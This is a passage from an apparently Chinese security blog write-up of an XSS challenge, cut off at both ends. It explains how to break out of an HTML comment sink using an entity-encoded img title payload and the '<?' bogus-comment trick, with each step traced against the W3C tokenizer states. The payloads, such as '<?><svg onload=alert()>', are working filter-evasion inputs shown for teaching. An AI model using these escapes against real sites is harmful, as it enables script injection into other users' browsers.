class="hljs-string">&quot;pwnme&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">var</span> input = (<span class="hljs-keyword">new</span> URL(location).searchParams.get(<span class="hljs-string">&apos;debug&apos;</span>) || <span class="hljs-string">&apos;&apos;</span>).replace(<span class="hljs-regexp">/[\!\-\/\#\&amp;\;\%]/g</span>, <span class="hljs-string">&apos;_&apos;</span>);</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">var</span> template = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&apos;template&apos;</span>);</span></span><br><span class="line">    template.innerHTML = input;</span><br><span class="line"><span class="hljs-handlebars"><span class="hljs-xml">    pwnme.innerHTML = &quot;<span class="hljs-comment">&lt;!-- &lt;p&gt; DE<span class="hljs-doctag">BUG:</span> &quot; + template.outerHTML + &quot; &lt;/p&gt; --&gt;</span>&quot;;</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x9898;&#x76EE;&#x6E90;&#x4EE3;&#x7801;&#x5982;&#x4E0A;&#xFF0C;&#x9898;&#x76EE;&#x4EE3;&#x7801;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#xFF0C;&#x9996;&#x5148;&#x5BF9;&#x7528;&#x6237;&#x4F20;&#x5165;&#x7684; debug &#x53C2;&#x6570;&#x8FDB;&#x884C;&#x5173;&#x952E;&#x5B57;&#x8FC7;&#x6EE4;&#x8F6C;&#x6362;&#xFF0C;&#x5BF9;&#x4E8E;<code>!-/#&amp;;%</code>&#x7B26;&#x53F7;&#x90FD;&#x4F1A;&#x88AB;&#x4E0B;&#x5212;&#x7EBF;&#x66FF;&#x4EE3;&#xFF0C;&#x7136;&#x540E;&#x521B;&#x5EFA;&#x4E00;&#x4E2A; template &#x6807;&#x7B7E;&#xFF0C;&#x6807;&#x7B7E;&#x7684; HTML &#x5185;&#x5BB9;&#x4E3A;&#x6211;&#x4EEC;&#x4F20;&#x5165;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x6700;&#x540E;&#x5728;&#x4E00;&#x4E2A; div &#x4E2D;&#xFF0C;&#x628A;&#x6784;&#x5EFA;&#x597D;&#x7684; template &#x6807;&#x7B7E;&#x8F93;&#x51FA;&#x5728;&#x4E00;&#x4E2A;&#x6CE8;&#x91CA;&#x5F53;&#x4E2D;&#x3002;</p><p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x7684;&#x4E3B;&#x8981;&#x5F97;&#x7ED5;&#x8FC7;&#x6CE8;&#x91CA;&#x7B26;&#x7684;&#x9650;&#x5236;&#xFF0C;&#x7531;&#x4E8E;<code>&lt;!--</code>&#x662F;&#x591A;&#x884C;&#x6CE8;&#x91CA;&#xFF0C;&#x6240;&#x4EE5;&#x6362;&#x884C;&#x7684;&#x601D;&#x8DEF;&#x6211;&#x4EEC;&#x57FA;&#x672C;&#x4E0D;&#x53EF;&#x884C;&#xFF0C;&#x5373;&#x4F7F;&#x6CA1;&#x6709;&#x628A;<code>--</code>&#x8FC7;&#x6EE4;&#xFF0C;JS&#x4E5F;&#x4F1A;&#x5728;&#x7B2C;&#x4E00;&#x6B65;<code>template.innerHTML</code>&#x5C06;&#x6211;&#x4EEC;&#x7684;<code>--&gt;</code>&#x4E2D;&#x7684;<code>&gt;</code>&#x8FDB;&#x884C;&#x8F6C;&#x4E49;&#x3002;&#x6240;&#x4EE5;&#x57FA;&#x672C;&#x4E0A;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x201C;&#x76F4;&#x63A5;&#x201C;&#x95ED;&#x5408;&#x7684;&#x601D;&#x8DEF;&#x662F;&#x884C;&#x4E0D;&#x901A;&#x7684;&#x3002;</p><p>&#x9996;&#x5148;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x77E5;&#x9053; HTML &#x89E3;&#x6790;&#x987A;&#x5E8F;&#xFF0C;&#x9996;&#x5148;&#x5148;&#x89E3;&#x6790; HTML &#x90E8;&#x5206;&#x4EE3;&#x7801;&#xFF0C;&#x518D;&#x7528; JS &#x89E3;&#x91CA;&#x5668; JS &#x4EE3;&#x7801;&#xFF0C;JS&#x89E3;&#x91CA;&#x5668;&#x4F1A;&#x8FB9;&#x89E3;&#x91CA;&#x8FB9;&#x6267;&#x884C;&#xFF0C;&#x5BF9;&#x4E8E; innerHTML &#x4F1A;&#x4F7F;&#x7528; HTML parser &#x89E3;&#x6790;&#x5176;&#x4E2D;&#x7684;&#x4EE3;&#x7801;&#x3002;&#x672C;&#x9898;&#x4F1A;&#x5229;&#x7528;&#x5230;&#x4E00;&#x4E9B; HTML parser &#x7684;&#x77E5;&#x8BC6;&#xFF0C;&#x5EFA;&#x8BAE;&#x914D;&#x5408; W3 &#x6587;&#x6863; <a href="https://www.w3.org/TR/html52/syntax.html" target="_blank" rel="noopener">The HTML syntax</a>&#xFF0C;&#x4E0D;&#x60F3;&#x770B;&#x82F1;&#x6587;&#x7684;&#x8BDD;&#x4E5F;&#x53EF;&#x4EE5;&#x51D1;&#x5408;&#x51D1;&#x5408;&#x770B;&#x770B;&#x672C;&#x83DC;&#x4E4B;&#x524D;&#x5199;&#x7684; <a href="https://blog.zeddyu.info/2019/03/13/Web&#x5B89;&#x5168;&#x4ECE;&#x96F6;&#x5F00;&#x59CB;-XSS-I/#Encode">&#x5173;&#x4E8E; HTML &#x7F16;&#x7801;</a> &#x7684;&#x6C34;&#x6587;&#x3002;</p><h3 id="Easy-Version"><a href="#Easy-Version" class="headerlink" title="Easy Version"></a>Easy Version</h3><p>&#x6211;&#x4EEC;&#x5148;&#x6765;&#x770B;&#x770B;&#x7B2C;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x7248;&#x672C;&#xFF0C;&#x5F53;&#x65F6;&#x7531;&#x4E8E;&#x51FA;&#x9898;&#x8005;&#x6BD4;&#x8F83;&#x758F;&#x5FFD;&#xFF0C;&#x5E76;&#x6CA1;&#x6709;&#x8FC7;&#x6EE4;<code>&amp;#;</code>&#xFF0C;&#x5BFC;&#x81F4;&#x4E86;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x7528; HTML &#x5B9E;&#x4F53;&#x7F16;&#x7801;&#x8FDB;&#x884C;&#x7ED5;&#x8FC7;&#xFF0C;&#x76F4;&#x63A5;&#x95ED;&#x5408;&#x6CE8;&#x91CA;&#x8FDB;&#x800C;&#x5B9E;&#x73B0; alert &#xFF0C;&#x4F8B;&#x5982;&#xFF0C;&#x5728;&#x6CA1;&#x6709;&#x8FC7;&#x6EE4;<code>&amp;#;</code>&#x7684;&#x60C5;&#x51B5;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8FD9;&#x4E48;&#x505A;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;<span class="hljs-symbol">&amp;#x2D;</span><span class="hljs-symbol">&amp;#x2D;</span><span class="hljs-symbol">&amp;#x3E;</span><span class="hljs-symbol">&amp;#x3C;</span><span class="hljs-symbol">&amp;#x73;</span><span class="hljs-symbol">&amp;#x76;</span><span class="hljs-symbol">&amp;#x67;</span><span class="hljs-symbol">&amp;#x2F;</span><span class="hljs-symbol">&amp;#x6F;</span><span class="hljs-symbol">&amp;#x6E;</span><span class="hljs-symbol">&amp;#x6C;</span><span class="hljs-symbol">&amp;#x6F;</span><span class="hljs-symbol">&amp;#x61;</span><span class="hljs-symbol">&amp;#x64;</span><span class="hljs-symbol">&amp;#x3D;</span><span class="hljs-symbol">&amp;#x61;</span><span class="hljs-symbol">&amp;#x6C;</span><span class="hljs-symbol">&amp;#x65;</span><span class="hljs-symbol">&amp;#x72;</span><span class="hljs-symbol">&amp;#x74;</span><span class="hljs-symbol">&amp;#x28;</span><span class="hljs-symbol">&amp;#x29;</span><span class="hljs-symbol">&amp;#x3E;</span>&quot;</span>&gt;</span>1</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4F7F;&#x7528; HTML &#x7F16;&#x7801;&#x5C06;&#x6211;&#x4EEC;&#x7684; payload &#x8FDB;&#x884C;&#x7F16;&#x7801;&#x7ED5;&#x8FC7;</p><p></p><figure class="highlight xml hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--&gt;<span class="hljs-tag">&lt;<span class="hljs-name">svg</span>/<span class="hljs-attr">onload</span>=<span class="hljs-string">alert()</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200131165018.png" alt></p><p>&#x4F46;&#x662F;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x5E76;&#x4E0D;&#x80FD;&#x76F4;&#x63A5;&#x4F20;&#x5165; HTML &#x7F16;&#x7801;&#x7ED5;&#x8FC7;&#xFF0C;&#x5F97;&#x9700;&#x8981;&#x52A0;&#x4E00;&#x4E2A; img &#x6807;&#x7B7E;&#x5229;&#x7528;&#x5176;&#x5C5E;&#x6027;&#x8FDB;&#x884C;&#x7ED5;&#x8FC7;&#xFF0C;&#x4E3A;&#x4EC0;&#x4E48;&#x5462;&#xFF1F;</p><p>&#x56E0;&#x4E3A;&#x8FD9;&#x91CC;&#x5176;&#x5B9E;&#x6709;&#x4E24;&#x6B21; HTML &#x89E3;&#x7801;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x7B2C;&#x4E00;&#x4E2A;&#x662F;<code>template.innerHTML</code>&#xFF0C;&#x7B2C;&#x4E8C;&#x4E2A;&#x662F;<code>pwnme.innerHTML</code>&#xFF0C;&#x7B2C;&#x4E00;&#x4E2A;&#x89E3;&#x7801;&#x64CD;&#x4F5C;&#x4F1A;&#x76F4;&#x63A5;&#x628A;&#x6211;&#x4EEC;&#x4F20;&#x5165;&#x7684;&#x53C2;&#x6570;&#x8FDB;&#x884C;&#x89E3;&#x7801;&#xFF0C;&#x5E76;&#x4E14;&#x5BF9;&#x5176;&#x4E2D;&#x7684;<code>&lt;&gt;</code>&#x8FDB;&#x884C;&#x8F6C;&#x4E49;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#xFF0C;&#x5B9E;&#x9645;&#x4E0A;&#x7B2C;&#x4E00;&#x4E2A;&#x5F97;&#x5230;&#x7684;&#x662F;&#x5982;&#x4E0B;&#x5185;&#x5BB9;&#xFF1A;</p><p></p><figure class="highlight xml hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--<span class="hljs-symbol">&amp;gt;</span><span class="hljs-symbol">&amp;lt;</span>svg/onload=alert()<span class="hljs-symbol">&amp;gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5728;&#x7B2C;&#x4E8C;&#x6B65;&#x6E32;&#x67D3;&#x7684;&#x65F6;&#x5019;&#x5C31;&#x81EA;&#x7136;&#x4E0D;&#x53EF;&#x80FD;&#x95ED;&#x5408;&#x6CE8;&#x91CA;&#x4E86;&#xFF0C;&#x53EA;&#x80FD;&#x5F97;&#x5230;&#x5982;&#x4E0B;&#x4EE3;&#x7801;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">&lt;!-- &lt;p&gt; DE<span class="hljs-doctag">BUG:</span> &lt;template&gt;--&amp;gt;&amp;lt;svg/onload=alert()&amp;gt;&lt;/template&gt; &lt;/p&gt; --&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6240;&#x4EE5;&#x5F53;&#x6211;&#x4EEC;&#x501F;&#x52A9; img &#x5C5E;&#x6027;&#x8FDB;&#x884C;&#x7ED5;&#x8FC7;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x7B2C;&#x4E00;&#x6B65;&#x5F97;&#x5230;&#x7684;&#x5B9E;&#x9645;&#x4E0A;&#x662F;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;--&gt;&lt;svg/onload=alert()&gt;&quot;</span>&gt;</span>1</span><br></pre></td></tr></tbody></table></figure><p></p><p>HTML parser&#x4E0D;&#x4F1A;&#x5C06; title &#x5C5E;&#x6027;&#x5185;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x8FDB;&#x884C;&#x8F6C;&#x4E49;&#xFF0C;&#x6240;&#x4EE5;&#x7B2C;&#x4E8C;&#x6B65;&#x5F53;&#x76F4;&#x63A5;&#x8F93;&#x51FA;&#x5230;&#x9875;&#x9762;&#x7684;&#x65F6;&#x5019;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">&lt;!-- &lt;p&gt; DE<span class="hljs-doctag">BUG:</span> &lt;template&gt;&lt;img title=&quot;--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;alert()&quot;</span>&gt;</span>&quot;<span class="hljs-symbol">&amp;gt;</span>1 <span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span> --<span class="hljs-symbol">&amp;gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x7136;&#x540E;&#x5F53; HTML parser &#x89E3;&#x6790;&#x8FD9;&#x6BB5;&#x4EE3;&#x7801;&#x65F6;&#xFF0C;&#x9996;&#x5148;&#x7531;<code>&lt;!</code>&#x7684;&#x5B58;&#x5728;&#xFF0C;&#x4F1A;&#x8FDB;&#x5165;<a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-markup-declaration-open-state" target="_blank" rel="noopener">Markup declaration open state</a>&#xFF0C;&#x4E2D;&#x95F4;&#x7684;&#x4EE3;&#x7801;<code>&lt;p&gt; DEBUG: &lt;template&gt;&lt;img title=&quot;</code>&#x4F1A;&#x8BA9; HTML parser &#x8FDB;&#x5165;&#x4E00;&#x4E9B;&#x5176;&#x4ED6;&#x5173;&#x4E8E; comment &#x7684;&#x72B6;&#x6001;&#xFF0C;&#x8FD9;&#x4E9B;&#x90FD;&#x65E0;&#x5173;&#x7D27;&#x8981;&#xFF0C;&#x6700;&#x540E;&#x7684;<code>--&gt;</code>&#x8BA9; HTML parser &#x8FDB;&#x5165;&#x5230;&#x4E86;<a href="https://www.w3.org/TR/html52/syntax.html#comment-end-state" target="_blank" rel="noopener">Comment End State</a>&#xFF0C;&#x6839;&#x636E; W3 &#x6587;&#x6863;&#xFF1A;</p><blockquote><p>Comment end state</p><p>Consume the <a href="https://www.w3.org/TR/html52/syntax.html#next-input-character" target="_blank" rel="noopener">next input character</a>:</p><ul><li><p>U+003E GREATER-THAN SIGN (&gt;)</p><p>Switch to the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-data-state" target="_blank" rel="noopener">data state</a>. Emit the comment token.</p></li></ul></blockquote><p>&#x63A5;&#x7740;&#x6211;&#x4EEC;&#x5C31;&#x8FDB;&#x5165;&#x5230;&#x4E86; <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-data-state" target="_blank" rel="noopener">data state</a>&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x7ED3;&#x675F;&#x4E86;&#x6CE8;&#x91CA;&#x89E3;&#x6790;&#x72B6;&#x6001;&#x56DE;&#x5230;&#x4E86;&#x6700;&#x5F00;&#x59CB;&#x7684; HTML &#x89E3;&#x6790;&#x72B6;&#x6001;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x5BFC;&#x81F4;&#x6211;&#x4EEC;&#x5C31;&#x6210;&#x529F;&#x9003;&#x9038;&#x4E86;&#x6CE8;&#x91CA;&#x7B26;&#x3002;</p><h3 id="Difficult-Version"><a href="#Difficult-Version" class="headerlink" title="Difficult Version"></a>Difficult Version</h3><p>&#x518D;&#x8FC7;&#x6EE4;&#x4E86;&#x5B9E;&#x4F53;&#x7F16;&#x7801;<code>&amp;#;</code>&#x4E4B;&#x540E;&#x6211;&#x4EEC;&#x8981;&#x600E;&#x4E48;&#x7ED5;&#x8FC7;&#x5462;&#xFF1F;&#x6211;&#x4EEC;&#x5148;&#x7ED9;&#x51FA;&#x4E00;&#x4E2A; Trick &#xFF0C;&#x5728;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>&lt;?</code>&#x8FDB;&#x884C;&#x7ED5;&#x8FC7;&#x3002;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200131165157.png" alt></p><p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6211;&#x4EEC;&#x5728;&#x4F7F;&#x7528;&#x4E86;<code>&lt;?</code>&#x4E4B;&#x540E;&#x6210;&#x529F;&#x628A; p &#x6807;&#x7B7E;&#x9003;&#x9038;&#x4E86;&#x51FA;&#x6765;&#xFF0C;&#x53EF;&#x662F;&#x4E3A;&#x4EC0;&#x4E48;&#x5462;&#xFF1F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8F93;&#x51FA;&#x7B2C;&#x4E00;&#x6B65;&#x7684;<code>template.innerHTML</code>&#x770B;&#x770B;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200131165902.png" alt></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x5728;&#x7B2C;&#x4E00;&#x6B65;&#x6E32;&#x67D3;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F20;&#x5165;&#x7684;<code>&lt;?</code>&#x5DF2;&#x7ECF;&#x53D8;&#x6210;&#x4E86;<code>&lt;!--?--&gt;</code>&#xFF0C;&#x5B58;&#x5728;<code>--&gt;</code>&#x53EF;&#x4EE5;&#x5C06;&#x6CE8;&#x91CA;&#x95ED;&#x5408;&#x3002;&#x53EF;&#x662F;&#x8FD9;&#x662F;&#x4E3A;&#x4EC0;&#x4E48;&#x5462;&#xFF1F;</p><p>&#x5728;<code>template.innerHTML = input</code>&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F1A;&#x89E3;&#x6790;<code>input</code>&#xFF0C;&#x7136;&#x540E;&#x4F7F;&#x7528; HTML parser &#x89E3;&#x6790;&#xFF0C;&#x6839;&#x636E; W3 &#x6587;&#x6863;</p><blockquote><p>&#x200B;    Implementations must act as if they used the following state machine to tokenize HTML. The state machine must start in the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-data-state" target="_blank" rel="noopener">data state</a>.</p></blockquote><p>&#x89E3;&#x6790;&#x5230;<code>&lt;</code>&#x7684;&#x65F6;&#x5019;&#xFF0C;HTML parser &#x6B63;&#x5904;&#x4E8E; <a href="https://www.w3.org/TR/html52/syntax.html#data-state" target="_blank" rel="noopener">data state</a></p><blockquote><p>Data state</p><p>Consume the <a href="https://www.w3.org/TR/html52/syntax.html#next-input-character" target="_blank" rel="noopener">next input character</a>:</p><ul><li><p>U+0026 AMPERSAND (&amp;)</p><p>Set the <a href="https://www.w3.org/TR/html52/syntax.html#return-state" target="_blank" rel="noopener">return state</a> to the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-data-state" target="_blank" rel="noopener">data state</a>. Switch to the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-character-reference-state" target="_blank" rel="noopener">character reference state</a>.</p></li><li><p>U+003C LESS-THAN SIGN (&lt;)</p><p>Switch to the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-tag-open-state" target="_blank" rel="noopener">tag open state</a>.</p></li><li><p>U+0000 NULL</p><p><a href="https://www.w3.org/TR/html52/syntax.html#parse-errors" target="_blank" rel="noopener">Parse error</a>. Emit the <a href="https://www.w3.org/TR/html52/syntax.html#current-input-character" target="_blank" rel="noopener">current input character</a> as a character token.</p></li><li><p>EOF</p><p>Emit an end-of-file token.</p></li><li><p>Anything else</p><p>Emit the <a href="https://www.w3.org/TR/html52/syntax.html#current-input-character" target="_blank" rel="noopener">current input character</a> as a character token.</p></li></ul></blockquote><p>&#x4E8E;&#x662F;&#x8FDB;&#x5165; <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-tag-open-state" target="_blank" rel="noopener">tag open state</a></p><blockquote><p>Tag open state</p><p>Consume the <a href="https://www.w3.org/TR/html52/syntax.html#next-input-character" target="_blank" rel="noopener">next input character</a>:</p><ul><li><p>U+0021 EXCLAMATION MARK (!)</p><p>Switch to the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-markup-declaration-open-state" target="_blank" rel="noopener">markup declaration open state</a>.</p></li><li><p>U+002F SOLIDUS (/)</p><p>Switch to the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-end-tag-open-state" target="_blank" rel="noopener">end tag open state</a>.</p></li><li><p><a href="https://www.w3.org/TR/html52/infrastructure.html#ascii-letters" target="_blank" rel="noopener">ASCII letter</a></p><p>Create a new start tag token, set its tag name to the empty string. <a href="https://www.w3.org/TR/html52/syntax.html#reconsume" target="_blank" rel="noopener">Reconsume</a> in the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-tag-name-state" target="_blank" rel="noopener">tag name state</a>.</p></li><li><p>U+003F QUESTION MARK (?)</p><p><a href="https://www.w3.org/TR/html52/syntax.html#parse-errors" target="_blank" rel="noopener">Parse error</a>. Create a comment token whose data is the empty string. <a href="https://www.w3.org/TR/html52/syntax.html#reconsume" target="_blank" rel="noopener">Reconsume</a> in the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-bogus-comment-state" target="_blank" rel="noopener">bogus comment state</a>.</p></li><li><p>Anything else</p><p><a href="https://www.w3.org/TR/html52/syntax.html#parse-errors" target="_blank" rel="noopener">Parse error</a>. Emit a U+003C LESS-THAN SIGN character token. <a href="https://www.w3.org/TR/html52/syntax.html#reconsume" target="_blank" rel="noopener">Reconsume</a> in the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-data-state" target="_blank" rel="noopener">data state</a>.</p></li></ul></blockquote><p>&#x4E0B;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x662F;<code>?</code>&#xFF0C;&#x6839;&#x636E;&#x6587;&#x6863;&#xFF0C;HTML parser &#x4F1A;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x7A7A;&#x7684; comment token&#xFF0C;&#x8FDB;&#x5165; <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-bogus-comment-state" target="_blank" rel="noopener">bogus comment state</a>&#xFF0C;</p><blockquote><p>Bogus comment state</p><p>Consume the <a href="https://www.w3.org/TR/html52/syntax.html#next-input-character" target="_blank" rel="noopener">next input character</a>:</p><ul><li><p>U+003E GREATER-THAN SIGN (&gt;)</p><p>Switch to the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-data-state" target="_blank" rel="noopener">data state</a>. Emit the comment token.</p></li><li><p>EOF</p><p>Emit the comment. Emit an end-of-file token.</p></li><li><p>U+0000 NULL</p><p>Append a U+FFFD REPLACEMENT CHARACTER character to the comment token&#x2019;s data.</p></li><li><p>Anything else</p><p>Append the <a href="https://www.w3.org/TR/html52/syntax.html#current-input-character" target="_blank" rel="noopener">current input character</a> to the comment token&#x2019;s data.</p></li></ul></blockquote><p>&#x4E0B;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x662F; anything else&#xFF0C;&#x4F1A;&#x5C06;&#x8FD9;&#x4E2A;&#x5B57;&#x7B26;&#x63D2;&#x5165;&#x5230;&#x521A;&#x521A;&#x7684; comment &#x4E2D;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x4E0A;&#x56FE;&#x770B;&#x5230;&#x7684;<code>&lt;!--?--&gt;</code>&#xFF0C;&#x4F8B;&#x5982;&#x8F93;&#x5165;&#x662F;<code>aaa&lt;?bbb&gt;ccc</code>&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x89E3;&#x6790;&#x5230;&#x7B2C; i &#x4E2A;&#x5B57;&#x7B26;&#x65F6;&#xFF0C;innerHTML &#x7684;&#x7ED3;&#x679C;&#x662F;&#x8FD9;&#x6837;&#x7684;&#xFF1A;</p><p></p><figure class="highlight django hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-xml">a</span></span><br><span class="line"><span class="hljs-xml">aa</span></span><br><span class="line"><span class="hljs-xml">aaa</span></span><br><span class="line"><span class="hljs-xml">aaa<span class="hljs-tag">&lt;</span></span></span><br><span class="line"><span class="hljs-xml">aaa<span class="hljs-comment">&lt;!--?--&gt;</span></span></span><br><span class="line"><span class="hljs-xml">aaa<span class="hljs-comment">&lt;!--?b--&gt;</span></span></span><br><span class="line"><span class="hljs-xml">aaa<span class="hljs-comment">&lt;!--?bb--&gt;</span></span></span><br><span class="line"><span class="hljs-xml">aaa<span class="hljs-comment">&lt;!--?bbb--&gt;</span></span></span><br><span class="line"><span class="hljs-xml">aaa<span class="hljs-comment">&lt;!--?bbb--&gt;</span></span></span><br><span class="line"><span class="hljs-xml">aaa<span class="hljs-comment">&lt;!--?bbb--&gt;</span>c</span></span><br><span class="line"><span class="hljs-xml">aaa<span class="hljs-comment">&lt;!--?bbb--&gt;</span>cc</span></span><br><span class="line"><span class="hljs-xml">aaa<span class="hljs-comment">&lt;!--?bbb--&gt;</span>ccc</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x76F4;&#x5230;&#x8BE5;&#x72B6;&#x6001;&#x9047;&#x5230;&#x4E86;<code>&gt;</code>&#x4E3A;&#x6B62;&#xFF0C;&#x56DE;&#x5230; data state&#x3002;&#x6CE8;&#x610F;&#x8FD9;&#x4E2A; Bogus comment state &#x89E3;&#x6790;&#x5230;<code>&gt;</code>&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x76F4;&#x63A5;&#x56DE;&#x5230; data state&#xFF0C;&#x4E5F;&#x5C31;&#x662F; HTML parser &#x6700;&#x5F00;&#x59CB;&#x89E3;&#x6790;&#x7684;&#x72B6;&#x6001;&#xFF0C;&#x8FD9;&#x4E2A;&#x65F6;&#x5019;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x63D2;&#x5165; HTML &#x4EE3;&#x7801;&#x4E86;&#x3002;</p><p>&#x5F53;&#x6211;&#x4EEC;&#x4F20;&#x5165;<code>&lt;?&gt;&lt;svg onload=alert()&gt;</code>&#x65F6;&#xFF0C;&#x7B2C;&#x4E00;&#x6B65;<code>template.innerHTML</code>&#x6211;&#x4EEC;&#x5F97;&#x5230;&#x7684;&#x662F;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">&lt;!--?--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;alert()&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x7B2C;&#x4E8C;&#x6B65;<code>pwnme.innerHTML</code>&#x6211;&#x4EEC;&#x5F97;&#x5230;&#x7684;&#x662F;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">&lt;!-- &lt;p&gt; DE<span class="hljs-doctag">BUG:</span> &lt;template&gt;&lt;!--?--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;alert()&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span> --<span class="hljs-symbol">&amp;gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x65F6;&#x5019; HTML parser &#x89E3;&#x6790;&#x4E0E;&#x6211;&#x4EEC;&#x5728; Easy Version &#x5206;&#x6790;&#x5DEE;&#x4E0D;&#x591A;&#xFF0C;&#x53EA;&#x6709;&#x9047;&#x5230;<code>--&gt;</code>&#x7684;&#x65F6;&#x5019;&#x7ED3;&#x675F; Comment State &#x76F8;&#x5173;&#x72B6;&#x6001;&#x56DE;&#x5230; data state&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x5C31;&#x6210;&#x529F;&#x6267;&#x884C;&#x4E86; XSS&#x3002;</p><h2 id="Keanu"><a href="#Keanu" class="headerlink" title="Keanu"></a>Keanu</h2><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span 